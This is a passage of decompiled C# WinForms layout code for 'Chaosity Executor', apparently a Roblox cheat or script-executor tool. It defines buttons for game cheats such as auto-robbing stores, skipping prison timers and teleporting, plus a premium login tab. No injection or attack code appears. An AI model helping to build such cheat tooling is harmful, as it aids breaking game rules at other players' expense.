      this.button36.Cursor = Cursors.Hand;
      this.button36.FlatAppearance.BorderColor = System.Drawing.Color.Orange;
      this.button36.FlatAppearance.BorderSize = 2;
      this.button36.FlatAppearance.MouseDownBackColor = System.Drawing.Color.FromArgb(45, 45, 45);
      this.button36.FlatAppearance.MouseOverBackColor = System.Drawing.Color.FromArgb(40, 40, 40);
      this.button36.FlatStyle = FlatStyle.Flat;
      this.button36.Font = new Font("Roboto", 8f, FontStyle.Bold);
      this.button36.ForeColor = System.Drawing.Color.White;
      this.button36.Location = new Point(97, 180);
      this.button36.Name = "button36";
      this.button36.Size = new Size(136, 25);
      this.button36.TabIndex = 52;
      this.button36.Text = "Get Instant Keycard";
      this.button36.UseVisualStyleBackColor = false;
      this.button36.Visible = false;
      this.button36.Click += new EventHandler(this.button36_Click);
      this.button34.BackColor = System.Drawing.Color.Black;
      this.button34.Cursor = Cursors.Hand;
      this.button34.FlatAppearance.BorderColor = System.Drawing.Color.Orange;
      this.button34.FlatAppearance.BorderSize = 2;
      this.button34.FlatAppearance.MouseDownBackColor = System.Drawing.Color.FromArgb(45, 45, 45);
      this.button34.FlatAppearance.MouseOverBackColor = System.Drawing.Color.FromArgb(40, 40, 40);
      this.button34.FlatStyle = FlatStyle.Flat;
      this.button34.Font = new Font("Roboto", 8f, FontStyle.Bold);
      this.button34.ForeColor = System.Drawing.Color.White;
      this.button34.Location = new Point(15, 149);
      this.button34.Name = "button34";
      this.button34.Size = new Size(115, 25);
      this.button34.TabIndex = 50;
      this.button34.Text = "Ctrl Click TP";
      this.button34.UseVisualStyleBackColor = false;
      this.button34.Visible = false;
      this.button34.Click += new EventHandler(this.button34_Click);
      this.button31.BackColor = System.Drawing.Color.Black;
      this.button31.Cursor = Cursors.Hand;
      this.button31.FlatAppearance.BorderColor = System.Drawing.Color.Orange;
      this.button31.FlatAppearance.BorderSize = 2;
      this.button31.FlatAppearance.MouseDownBackColor = System.Drawing.Color.FromArgb(45, 45, 45);
      this.button31.FlatAppearance.MouseOverBackColor = System.Drawing.Color.FromArgb(40, 40, 40);
      this.button31.FlatStyle = FlatStyle.Flat;
      this.button31.Font = new Font("Roboto", 8f, FontStyle.Bold);
      this.button31.ForeColor = System.Drawing.Color.White;
      this.button31.Location = new Point(96, 180);
      this.button31.Name = "button31";
      this.button31.Size = new Size(136, 25);
      this.button31.TabIndex = 48;
      this.button31.Text = "No Prison Wait Timer";
      this.button31.UseVisualStyleBackColor = false;
      this.button31.Visible = false;
      this.button31.Click += new EventHandler(this.button31_Click);
      this.button20.BackColor = System.Drawing.Color.Black;
      this.button20.Cursor = Cursors.Hand;
      this.button20.FlatAppearance.BorderColor = System.Drawing.Color.Orange;
      this.button20.FlatAppearance.BorderSize = 2;
      this.button20.FlatAppearance.MouseDownBackColor = System.Drawing.Color.FromArgb(45, 45, 45);
      this.button20.FlatAppearance.MouseOverBackColor = System.Drawing.Color.FromArgb(40, 40, 40);
      this.button20.FlatStyle = FlatStyle.Flat;
      this.button20.Font = new Font("Roboto", 8f, FontStyle.Bold);
      this.button20.ForeColor = System.Drawing.Color.White;
      this.button20.Location = new Point(96, 53);
      this.button20.Name = "button20";
      this.button20.Size = new Size(136, 25);
      this.button20.TabIndex = 47;
      this.button20.Text = "AutoRob Big Stores";
      this.button20.UseVisualStyleBackColor = false;
      this.button20.Visible = false;
      this.button20.Click += new EventHandler(this.button20_Click);
      this.JailbreakTeleports.BackColor = System.Drawing.Color.Black;
      this.JailbreakTeleports.Controls.Add((Control) this.button66);
      this.JailbreakTeleports.Controls.Add((Control) this.button65);
      this.JailbreakTeleports.Controls.Add((Control) this.button35);
      this.JailbreakTeleports.Controls.Add((Control) this.button33);
      this.JailbreakTeleports.Location = new Point(4, 22);
      this.JailbreakTeleports.Name = "JailbreakTeleports";
      this.JailbreakTeleports.Size = new Size(603, 306);
      this.JailbreakTeleports.TabIndex = 5;
      this.JailbreakTeleports.Text = "JailbreakTeleports";
      this.button66.BackColor = System.Drawing.Color.Black;
      this.button66.Cursor = Cursors.Hand;
      this.button66.FlatAppearance.BorderColor = System.Drawing.Color.Orange;
      this.button66.FlatAppearance.BorderSize = 2;
      this.button66.FlatAppearance.MouseDownBackColor = System.Drawing.Color.FromArgb(45, 45, 45);
      this.button66.FlatAppearance.MouseOverBackColor = System.Drawing.Color.FromArgb(40, 40, 40);
      this.button66.FlatStyle = FlatStyle.Flat;
      this.button66.Font = new Font("Roboto", 8f, FontStyle.Bold);
      this.button66.ForeColor = System.Drawing.Color.White;
      this.button66.Location = new Point(399, 29);
      this.button66.Name = "button66";
      this.button66.Size = new Size(122, 25);
      this.button66.TabIndex = 82;
      this.button66.Text = "TP To Sewers";
      this.button66.UseVisualStyleBackColor = false;
      this.button65.BackColor = System.Drawing.Color.Black;
      this.button65.Cursor = Cursors.Hand;
      this.button65.FlatAppearance.BorderColor = System.Drawing.Color.Orange;
      this.button65.FlatAppearance.BorderSize = 2;
      this.button65.FlatAppearance.MouseDownBackColor = System.Drawing.Color.FromArgb(45, 45, 45);
      this.button65.FlatAppearance.MouseOverBackColor = System.Drawing.Color.FromArgb(40, 40, 40);
      this.button65.FlatStyle = FlatStyle.Flat;
      this.button65.Font = new Font("Roboto", 8f, FontStyle.Bold);
      this.button65.ForeColor = System.Drawing.Color.White;
      this.button65.Location = new Point(271, 29);
      this.button65.Name = "button65";
      this.button65.Size = new Size(122, 25);
      this.button65.TabIndex = 81;
      this.button65.Text = "TP To Camaro";
      this.button65.UseVisualStyleBackColor = false;
      this.button35.BackColor = System.Drawing.Color.Black;
      this.button35.Cursor = Cursors.Hand;
      this.button35.FlatAppearance.BorderColor = System.Drawing.Color.Orange;
      this.button35.FlatAppearance.BorderSize = 2;
      this.button35.FlatAppearance.MouseDownBackColor = System.Drawing.Color.FromArgb(45, 45, 45);
      this.button35.FlatAppearance.MouseOverBackColor = System.Drawing.Color.FromArgb(40, 40, 40);
      this.button35.FlatStyle = FlatStyle.Flat;
      this.button35.Font = new Font("Roboto", 8f, FontStyle.Bold);
      this.button35.ForeColor = System.Drawing.Color.White;
      this.button35.Location = new Point(143, 29);
      this.button35.Name = "button35";
      this.button35.Size = new Size(122, 25);
      this.button35.TabIndex = 80;
      this.button35.Text = "TP Outside Prison";
      this.button35.UseVisualStyleBackColor = false;
      this.button33.BackColor = System.Drawing.Color.Black;
      this.button33.Cursor = Cursors.Hand;
      this.button33.FlatAppearance.BorderColor = System.Drawing.Color.Orange;
      this.button33.FlatAppearance.BorderSize = 2;
      this.button33.FlatAppearance.MouseDownBackColor = System.Drawing.Color.FromArgb(45, 45, 45);
      this.button33.FlatAppearance.MouseOverBackColor = System.Drawing.Color.FromArgb(40, 40, 40);
      this.button33.FlatStyle = FlatStyle.Flat;
      this.button33.Font = new Font("Roboto", 8f, FontStyle.Bold);
      this.button33.ForeColor = System.Drawing.Color.White;
      this.button33.Location = new Point(15, 29);
      this.button33.Name = "button33";
      this.button33.Size = new Size(122, 25);
      this.button33.TabIndex = 79;
      this.button33.Text = "TP Inside Prison";
      this.button33.UseVisualStyleBackColor = false;
      this.PremiumLogin.BackColor = System.Drawing.Color.Black;
      this.PremiumLogin.Controls.Add((Control) this.button62);
      this.PremiumLogin.Controls.Add((Control) this.label1);
      this.PremiumLogin.Controls.Add((Control) this.textBox2);
      this.PremiumLogin.Controls.Add((Control) this.button8);
      this.PremiumLogin.Location = new Point(4, 22);
      this.PremiumLogin.Name = "PremiumLogin";
      this.PremiumLogin.Size = new Size(603, 306);
      this.PremiumLogin.TabIndex = 6;
      this.PremiumLogin.Text = "PremiumLogin";
      this.button62.BackColor = System.Drawing.Color.Transparent;
      this.button62.Cursor = Cursors.Hand;
      this.button62.FlatAppearance.BorderColor = System.Drawing.Color.White;
      this.button62.FlatAppearance.BorderSize = 3;
      this.button62.FlatAppearance.MouseDownBackColor = System.Drawing.Color.FromArgb(45, 45, 45);
      this.button62.FlatAppearance.MouseOverBackColor = System.Drawing.Color.FromArgb(40, 40, 40);
      this.button62.FlatStyle = FlatStyle.Flat;
      this.button62.Font = new Font("Roboto", 12f, FontStyle.Bold);
      this.button62.ForeColor = System.Drawing.Color.White;
      this.button62.Location = new Point(296, 157);
      this.button62.Name = "button62";
      this.button62.Size = new Size(191, 34);
      this.button62.TabIndex = 125;
      this.button62.Text = "Login To Premium";
      this.button62.UseVisualStyleBackColor = false;
      this.button62.Click += new EventHandler(this.button62_Click);
      this.label1.AutoSize = true;
      this.label1.Font = new Font("Segoe UI", 36f, FontStyle.Bold | FontStyle.Italic, GraphicsUnit.Point, (byte) 0);
      this.label1.ForeColor = System.Drawing.Color.White;
      this.label1.Location = new Point(15, 33);
      this.label1.Name = "label1";
      this.label1.Size = new Size(573, 65);
      this.label1.TabIndex = 124;
      this.label1.Text = "Chaosity Authentication";
      this.textBox2.Location = new Point(93, 131);
      this.textBox2.Name = "textBox2";
      this.textBox2.Size = new Size(394, 20);
      this.textBox2.TabIndex = 123;
      this.textBox2.Visible = false;
      this.button8.BackColor = System.Drawing.Color.Transparent;
      this.button8.Cursor = Cursors.Hand;
      this.button8.FlatAppearance.BorderColor = System.Drawing.Color.White;
      this.button8.FlatAppearance.BorderSize = 3;
      this.button8.FlatAppearance.MouseDownBackColor = System.Drawing.Color.FromArgb(45, 45, 45);
      this.button8.FlatAppearance.MouseOverBackColor = System.Drawing.Color.FromArgb(40, 40, 40);
      this.button8.FlatStyle = FlatStyle.Flat;
      this.button8.Font = new Font("Roboto", 12f, FontStyle.Bold);
      this.button8.ForeColor = System.Drawing.Color.White;
      this.button8.Location = new Point(93, 157);
      this.button8.Name = "button8";
      this.button8.Size = new Size(191, 34);
      this.button8.TabIndex = 121;
      this.button8.Text = "Get Authenticaton Key";
      this.button8.UseVisualStyleBackColor = false;
      this.button8.Click += new EventHandler(this.button8_Click_2);
      this.button6.BackColor = System.Drawing.Color.Black;
      this.button6.Cursor = Cursors.Hand;
      this.button6.FlatAppearance.BorderColor = System.Drawing.Color.White;
      this.button6.FlatAppearance.MouseDownBackColor = System.Drawing.Color.FromArgb(45, 45, 45);
      this.button6.FlatAppearance.MouseOverBackColor = System.Drawing.Color.FromArgb(40, 40, 40);
      this.button6.FlatStyle = FlatStyle.Flat;
      this.button6.Font = new Font("Bahnschrift", 8f);
      this.button6.ForeColor = System.Drawing.Color.White;
      this.button6.Location = new Point(573, 8);
      this.button6.Name = "button6";
      this.button6.Size = new Size(20, 20);
      this.button6.TabIndex = 43;
      this.button6.Text = "X";
      this.button6.UseVisualStyleBackColor = false;
      this.button6.Click += new EventHandler(this.button6_Click);
      this.AutoScaleDimensions = new SizeF(6f, 13f);
      this.AutoScaleMode = AutoScaleMode.Font;
      this.BackColor = System.Drawing.Color.Black;
      this.ClientSize = new Size(601, 327);
      this.Controls.Add((Control) this.button6);
      this.Controls.Add((Control) this.panel1);
      this.Controls.Add((Control) this.tabControl1);
      this.ForeColor = System.Drawing.Color.White;
      this.FormBorderStyle = FormBorderStyle.None;
      this.MaximumSize = new Size(601, 327);
      this.MinimumSize = new Size(601, 327);
      this.Name = "Chaosity";
      this.ShowIcon = false;
      this.Text = "Chaosity Executor";
      this.TopMost = true;
      this.Load += new EventHandler(this.Chaosity_Load);
      this.Leave += new EventHandler(this.Chaosity_Leave);
      this.panel1.ResumeLayout(false);
      this.panel1.PerformLayout();
      this.tabControl1.ResumeLayout(false);
      this.MainPage.ResumeLayout(false);
      this.Settings.ResumeLayout(false);
      this.Settings.PerformLayout();
      this.PremiumGames.ResumeLayout(false);
      this.flowLayoutPanel1.ResumeLayout(false);
      this.panel2.ResumeLayout(false);
      ((ISupportInitialize) this.pictureBox1).EndInit();
      this.panel5.ResumeLayout(false);
      ((ISupportInitialize) this.pictureBox6).EndInit();
      this.panel7.ResumeLayout(false);
      ((ISupportInitialize) this.pictureBox7).EndInit();
      this.panel8.ResumeLayout(false);
      ((ISupportInitialize) this.pictureBox8).EndInit();
      this.panel9.ResumeLayout(false);
      ((ISupportInitialize) this.pictureBox9).EndInit();
      this.GameHubs.ResumeLayout(false);
      this.PremiumScripts.ResumeLayout(false);
      this.JailbreakCommands.ResumeLayout(false);
      this.JailbreakCommands.PerformLayout();
      this.JailbreakTeleports.ResumeLayout(false);
      this.PremiumLogin.ResumeLayout(false);
      this.PremiumLogin.PerformLayout();
      this.ResumeLayout(false);
    }
  }
}
